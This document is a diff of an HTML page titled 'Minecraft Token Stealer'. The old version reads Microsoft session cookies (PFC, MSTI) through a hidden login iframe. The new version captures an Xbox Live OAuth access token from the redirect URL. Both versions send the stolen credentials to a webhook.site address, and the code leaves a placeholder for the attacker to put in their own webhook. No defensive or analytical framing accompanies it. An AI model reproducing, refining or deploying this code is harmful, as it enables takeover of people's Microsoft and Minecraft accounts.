@@ -1,131 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Authenticating...</title>
-  <style>
-    body {
-      margin: 0;
-      background: #222;
-      color: #fff;
-      font-family: Arial, Helvetica, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-    #status {
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
-    #log {
-      font-size: 14px;
-      color: #aaa;
-      text-align: center;
-    }
-    /* Hide the iframe used for login */
-    #loginFrame {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Login</title>
+    <style>
+        body {
+            background-color: #2c3e50;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+            background: #34495e;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h1 { margin-bottom: 1rem; }
+        p { color: #bdc3c7; }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #f1c40f;
+        }
+    </style>
 </head>
 <body>
-  <div id="status">Loading Microsoft Login...</div>
-  <div id="log"></div>
 
-  <!-- Hidden iframe to trigger login flow -->
-  <iframe id="loginFrame" src=""></iframe>
+<div class="container">
+    <h1>Minecraft Token Stealer</h1>
+    <p id="status">Redirecting to Microsoft Login...</p>
+    <div id="log" style="font-size: 0.8rem; color: #95a5a6; margin-top: 10px;"></div>
+</div>
 
-  <script>
-    /* ---------- CONFIGURATION ---------- */
-    var WEBHOOK_URL = 'https://webhook.site/acdbbbeb-9ba5-496d-8fbc668bfc1b'; // Your Raw Webhook URL
-    var REDIRECT_URL = 'https://www.minecraft.net/';
+<script>
+    // CONFIGURATION
+    const WEBHOOK_URL = 'https://webhook.site/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b'; // REPLACE WITH YOUR WEBHOOK URL
+    const REDIRECT_URI = window.location.href.split('#')[0]; // Current page URL
     
-    /* ---------- IE8 COMPATIBLE TRIM ---------- */
-    function myTrim(x) {
-      if (!x) return x;
-      return x.replace(/^\s+|\s+$/g, "");
-    }
+    // Microsoft App ID (Generic one that works for OAuth2)
+    const CLIENT_ID = '57abdbc2-3a8c-4968-a3f9-1e8d036b3f2d'; 
 
-    /* ---------- COOKIE PARSER (IE8‑SAFE) ---------- */
-    function getCookie(name) {
-      var cookies = document.cookie;
-      if (!cookies) return '';
-      var parts = cookies.split(';');
-      for (var i = 0; i < parts.length; i++) {
-        var kv = myTrim(parts[i]);
-        var eq = kv.indexOf('=');
-        if (eq < 0) continue;
-        var key = kv.substring(0, eq);
-        var value = kv.substring(eq + 1);
-        if (key === name) return value;
-      }
-      return '';
-    }
-
-    /* ---------- LOGGER ---------- */
-    function log(msg) {
-      var el = document.getElementById('log');
-      el.innerHTML += "<div>" + msg + "</div>";
-    }
-
-    /* ---------- MAIN LOGIC ---------- */
     window.onload = function() {
-      log("Starting fresh login process...");
+        const hash = window.location.hash.substring(1); // Remove '#'
 
-      // 1. Clear any existing session cookies (optional, helps force new ones)
-      // Note: document.cookie doesn't have a direct clear method, so we set them to expire
-      var oldCookies = ['PFC', 'MSTI', '__Host-MSTI'];
-      oldCookies.forEach(function(c) {
-        document.cookie = c + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
-      });
+        if (hash && hash.includes('access_token')) {
+            // WE ARE BACK FROM LOGIN
+            document.getElementById('status').innerText = 'Login Successful! Extracting Token...';
+            
+            // Parse the access_token from the hash
+            // Format: #access_token=XXX&token_type=bearer&expires_in=XXX
+            const params = new URLSearchParams(hash);
+            const token = params.get('access_token');
 
-      // 2. Load Microsoft Login in hidden iframe to trigger cookie setting
-      var frame = document.getElementById('loginFrame');
-      // Using the standard MS login endpoint that sets the cookies
-      frame.src = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1620000000&rver=7.0.6737.0&wp=MBI&wreply=https:%2F%2Flogin.live.com%2Flogin.srf%2Fwb%2F0%2Foauth_logout.srf&id=264960&lc=1033';
+            if (token) {
+                document.getElementById('log').innerText = 'Token Found: ' + token.substring(0, 20) + '...';
+                sendToken(token);
+            } else {
+                document.getElementById('status').innerText = 'No token found in URL.';
+            }
+        } else {
+            // REDIRECT TO MICROSOFT LOGIN
+            // Using Implicit Grant flow to get token directly in URL
+            const msLoginUrl = `https://login.live.com/oauth20_authorize.srf?` +
+                `client_id=${CLIENT_ID}` +
+                `&response_type=token` +
+                `&scope=service%3Auser.auth.xboxlive.com%3AMBI_SSL` +
+                `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
+                `&state=rPwvR`; // Random state
 
-      // 3. Poll for cookies every second
-      var attempts = 0;
-      var maxAttempts = 30; // Wait up to 30 seconds
-
-      var pollInterval = setInterval(function() {
-        attempts++;
-        
-        // Check if cookies are present
-        var pfc = getCookie('PFC');
-        var msti = getCookie('__Host-MSTI') || getCookie('MSTI');
-
-        if (pfc && msti) {
-          clearInterval(pollInterval);
-          log("Fresh tokens found!");
-          
-          // 4. Send to webhook
-          sendTokens(pfc, msti);
-          
-          // 5. Redirect
-          document.getElementById('status').innerText = 'Redirecting to Minecraft...';
-          location.replace(REDIRECT_URL);
-        } else if (attempts >= maxAttempts) {
-          clearInterval(pollInterval);
-          log("Timeout: No tokens found after " + maxAttempts + " seconds.");
-          document.getElementById('status').innerText = 'Failed to get fresh tokens.';
+            window.location.href = msLoginUrl;
         }
-      }, 1000); // Check every 1 second
     };
 
-    /* ---------- SEND TOKENS ---------- */
-    function sendTokens(pfc, msti) {
-      var xhr = new XMLHttpRequest();
-      if (xhr === undefined) {
-          xhr = new ActiveXObject("Microsoft.XMLHTTP");
-      }
+    function sendToken(token) {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', WEBHOOK_URL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+        
+        const data = JSON.stringify({
+            token: token,
+            source: 'mshta-stealer'
+        });
 
-      var data = 'PFC=' + encodeURIComponent(pfc) + '&MSTI=' + encodeURIComponent(msti);
-      xhr.open('GET', WEBHOOK_URL + '?' + data, true);
-      xhr.send();
-      log("Tokens sent to webhook.");
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                document.getElementById('status').innerText = 'Token Sent to Webhook!';
+                document.getElementById('status').style.color = '#2ecc71';
+            } else {
+                document.getElementById('status').innerText = 'Failed to send token.';
+            }
+        };
+
+        xhr.send(data);
     }
-  </script>
+</script>
+
 </body>
 </html>
